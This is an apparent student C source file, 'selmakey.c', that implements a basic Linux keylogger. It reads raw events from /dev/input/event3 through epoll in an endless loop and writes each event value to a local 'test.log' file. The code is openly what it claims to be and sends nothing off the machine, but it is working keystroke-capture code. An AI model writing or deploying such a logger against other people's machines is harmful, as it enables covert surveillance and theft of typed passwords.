/*
** selmakey.c for selmakey in /home/casoni_f/Projets/selma/selmakey/special
** 
** Made by Fabien Casoni
** Login   <casoni_f@epitech.net>
** 
** Started on  Wed Jul  2 18:19:29 2014 Fabien Casoni
** Last update Wed Jul  2 18:59:49 2014 Fabien Casoni
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <sys/epoll.h>
#include <signal.h>
#include "selmakey.h"

void			sigint_handler(int sig)
{
  (void)sig;
  exit(0);
}

void			start_keylog(t_kl *kl)
{
  signal(SIGINT, sigint_handler);
  while (1337)
    {
      kl->ret = epoll_wait(kl->epoll_fd, &(kl->epoll_event),
			   NB_MAX_EVENTS, -1);
      read(kl->fd, &(kl->kbd_event), sizeof(kl->kbd_event));
      fprintf(kl->file, "%d\n", kl->kbd_event.value);
      fflush(kl->file);
    }
  close(kl->epoll_fd);
  close(kl->fd);
  fclose(kl->file);
}

int			main()
{
  t_kl			*kl;

  kl = malloc(sizeof(*kl));
  kl->fd = open("/dev/input/event3", O_RDONLY);
  kl->file = fopen("test.log", "w");
  kl->epoll_fd = epoll_create(sizeof(kl->fd));
  kl->epoll_event.events = EPOLLIN;
  kl->ctrl = epoll_ctl(kl->epoll_fd, EPOLL_CTL_ADD,
		       kl->fd, &(kl->epoll_event));
  start_keylog(kl);
  free(kl);
}
